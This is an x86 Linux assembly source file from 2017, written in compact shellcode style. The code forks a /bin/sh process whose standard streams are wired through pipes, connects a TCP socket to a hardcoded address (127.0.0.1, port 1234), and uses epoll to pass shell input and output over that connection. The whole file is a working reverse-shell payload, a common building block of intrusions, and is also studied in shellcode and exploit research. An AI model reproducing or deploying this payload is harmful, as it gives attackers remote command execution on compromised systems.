;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;  

%define SYS_exit           0x001
%define SYS_fork           0x002 
%define SYS_read           0x003
%define SYS_write          0x004
%define SYS_close          0x006
%define SYS_execve         0x00B
%define SYS_kill           0x025
%define SYS_pipe           0x02A
%define SYS_dup2           0x03f
%define SYS_socketcall     0x066
%define SYS_epoll_ctl      0x0FF
%define SYS_epoll_wait     0x100
%define SYS_epoll_create1  0x149
%define SYS_shutdown       0x175


%define STDIN_FILENO    0
%define STDOUT_FILENO   1
%define STDERR_FILENO   2

%define EPOLLIN     0x001

%define EPOLL_CTL_ADD 1
%define EPOLL_CTL_DEL 2
%define EPOLL_CTL_MOD 3

%define SYS_SOCKET      1   
%define SYS_BIND        2   
%define SYS_CONNECT     3   
%define SYS_LISTEN      4   
%define SYS_ACCEPT      5 
%define SYS_GETSOCKNAME 6   
%define SYS_GETPEERNAME 7   
%define SYS_SOCKETPAIR  8   
%define SYS_SEND        9   
%define SYS_RECV       10 
%define SYS_SENDTO     11   
%define SYS_RECVFROM   12   
%define SYS_SHUTDOWN   13   
%define SYS_SETSOCKOPT 14 
%define SYS_GETSOCKOPT 15   
%define SYS_SENDMSG    16   
%define SYS_RECVMSG    17     
%define SYS_ACCEPT4    18   
%define SYS_RECVMMSG   19 
%define SYS_SENDMMSG   20 

%define SIGCHLD 20
%define BUFSIZ  128

%define SHUT_RDWR     1

struc epoll_event
  events resd 1
  data   resd 1
endstruc
      
struc sc_prop
  p_in  resd 2
  p_out resd 2
  pid   resd 1
  s     resd 1  
  efd   resd 1  
  evts  resb epoll_event_size
  len   resd 1
  buf   resb BUFSIZ
endstruc
 
struc pushad_t
  _edi resd 1
  _esi resd 1
  _ebp resd 1
  _esp resd 1
  _ebx resd 1
  _edx resd 1
  _ecx resd 1
  _eax resd 1
  .size:
endstruc
 
    %ifndef BIN
      global main
      global _main
    %endif     
         
    bits 32
    
main:    
_main:
      pushad
      xor    ecx, ecx
      mov    cl, sc_prop_size
      sub    esp, ecx
      mov    edi, esp
      mov    ebp, esp
      
      ; create read/write pipes
      mov    cl, 2
c_pipe:      
      ; pipe(in);
      ; pipe(out);
      push   SYS_pipe
      pop    eax
      mov    ebx, edi             ; ebx = p_in or p_out      
      int    0x80      
      scasd                       ; edi += 4
      scasd                       ; edi += 4
      loop   c_pipe    
      
      ; pid = fork();
      push   SYS_fork
      pop    eax
      int    0x80    
      stosd                       ; save pid
      test   eax, eax             ; already forked?
      jz     opn_con              ; open connection

      ; in this order..
      ;
      ; dup2 (out[1], STDERR_FILENO)      
      ; dup2 (out[1], STDOUT_FILENO)
      ; dup2 (in[0], STDIN_FILENO)   
      mov    cl, 2                ; ecx = STDERR_FILENO
      mov    ebx, [ebp+p_out+4]   ; ebx = out[1]
c_dup:
      push   SYS_dup2
      pop    eax
      int    0x80
      dec    ecx               ; becomes STDOUT_FILENO, then STDIN_FILENO      
      cmove  ebx, [ebp+p_in]   ; replace stdin with in[0] for last call
      jns    c_dup  
  
      ; close pipe handles in this order..
      ;
      ; close(in[0]);
      ; close(in[1]);
      ; close(out[0]);
      ; close(out[1]);
      mov    esi, ebp          ; esi = p_in and p_out
      push   4
      pop    ecx               ; close 4 handles     
cls_pipe:
      lodsd                    ; eax = pipes[i]
      xchg   eax, ebx      
      push   SYS_close
      pop    eax 
      int    0x80
      loop   cls_pipe      
      
      ; execve("/bin//sh", 0, 0);
      push   SYS_execve
      pop    eax
      cdq                      ; edx = 0
      push   ecx               ; push null terminator
      push   '//sh'
      push   '/bin'
      mov    ebx, esp          ; ebx = "/bin//sh", 0
      int    0x80
opn_con:    
      ; close(in[0]);
      push   SYS_close
      pop    eax
      mov    ebx, [ebp+p_in]    
      int    0x80    

      ; close(out[1]);
      push   SYS_close
      pop    eax      
      mov    ebx, [ebp+p_out+4]    
      int    0x80   
      
      ; s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);     
      push   SYS_socketcall
      pop    eax
      cdq                      ; edx = 0
      push   SYS_SOCKET
      pop    ebx
      push   edx               ; protocol = IPPROTO_IP
      push   ebx               ; type     = SOCK_STREAM
      push   2                 ; family   = AF_INET
      mov    ecx, esp          ; ecx      = &args      
      int    0x80 
      stosd                    ; save socket

      push   0x0100007f        ; sa.sin_addr=127.0.0.1
      push   0xD2040002        ; sa.sin_port=htons(1234), sa.sin_family=AF_INET
      mov    ecx, esp          ; ecx = &sa
      
      ; connect (s, &sa, sizeof(sa));    
      push   16                ; sizeof(sa)      
      push   ecx               ; &sa
      push   eax               ; s
      mov    ecx, esp          ; &args
epx_con:      
      push   SYS_CONNECT
      pop    ebx               ; ebx=SYS_CONNECT
      push   SYS_socketcall
      pop    eax
      int    0x80      
      ; test   eax, eax
      ; jle    ??
      
      ; efd = epoll_create1(0);
      mov    eax, SYS_epoll_create1
      xor    ebx, ebx
      int    0x80
      stosd                    ; save efd
      
      xchg   eax, ebx          ; ebx = efd
      mov    edx, [ebp+s] 
      clc      
poll_init:
      ; epoll_ctl(efd, EPOLL_CTL_ADD, i==0 ? s : out[0], &evts);
      mov    esi, edi
      push   EPOLLIN
      pop    eax               ; evts.events = EPOLLIN
      mov    [esi+events], eax
      mov    [esi+data  ], edx ; evts.data.fd = i==0 ? s : out[0]
      mov    al, SYS_epoll_ctl    
      push   EPOLL_CTL_ADD
      pop    ecx
      int    0x80
      mov    edx, [ebp+p_out]  ; do out[0] in 2nd loop      
      cmc
      jc     poll_init      
      ; now loop until user exits or some other error      
poll_wait:
      ; epoll_wait(efd, &evts, 1, -1);
      mov    ebx, [ebp+efd]
      xor    eax, eax
      mov    ah, 1             ; eax = SYS_epoll_wait
      mov    ecx, edi          ; ecx = evts
      push   1                 ; edx = 1 event
      pop    edx
      or     esi, -1           ; no timeout
      int    0x80
      
      ; if (r <= 0) break;
      test   eax, eax
      jle    cls_sck
      
      mov    esi, edi
      lodsd                    ; eax = evt.events
      ; if (!(evt & EPOLLIN)) break;
      test   al, EPOLLIN
      jz     cls_sck
      
      lodsd                   ; eax = evt.data.fd 
      mov    ebx, [ebp+p_out] ; ebx = out[0]
      mov    esi, [ebp+s]     ; esi = s
      
      ; if (fd == s)
      cmp    eax, esi
      jne    do_read
      
      mov    ebx, esi          ; ebx = s
      mov    esi, [ebp+p_in+4] ; esi = in[1]
do_read:      
      ; len = read(r, buf, BUFSIZ);
      push   SYS_read
      pop    eax
      cdq
      mov    dl, BUFSIZ        ; edx = BUFSIZ
      int    0x80      
      xchg   eax, edx          ; edx = len 
      
      ; write(w, buf, len);
      mov    ebx, esi          ; ebx = out[0] or s
      push   SYS_write
      pop    eax
      int    0x80
      jmp    poll_wait
cls_sck:      
      ; shutdown(s, SHUT_RDWR);
      mov    eax, SYS_shutdown
      mov    ebx, [ebp+s]
      push   SHUT_RDWR
      pop    ecx
      int    0x80

      clc
      mov    edx, ebx ; fd = s
cls_efd:   
      ; epoll_ctl(efd, EPOLL_CTL_DEL, fd, NULL);
      push   0
      pop    eax
      mov    esi, eax
      mov    al, SYS_epoll_ctl
      mov    ebx, [ebp+efd]
      push   EPOLL_CTL_DEL
      pop    ecx
      int    0x80
      
      push   ebx
      
      ; close(fd);
      push   SYS_close
      pop    eax
      mov    ebx, edx      ; ebx = out[0] or s
      int    0x80
      ; do out[0] next      
      mov    edx, [ebp+p_out]
      pop    ebx
      cmc
      jc     cls_efd
      
      ; close(efd);
      push   SYS_close
      pop    eax
      int    0x80
      
      ; kill(pid, SIGCHLD);
      push   SYS_kill
      pop    eax
      mov    ebx, [ebp+pid]
      push   SIGCHLD
      pop    ecx
      int    0x80

      ; close(in[1]);
      push   SYS_close
      pop    eax      
      mov    ebx, [ebp+p_in+4]
      int    0x80   

      ; exit(0);
      push   SYS_exit
      pop    eax 
      int    0x80     
     
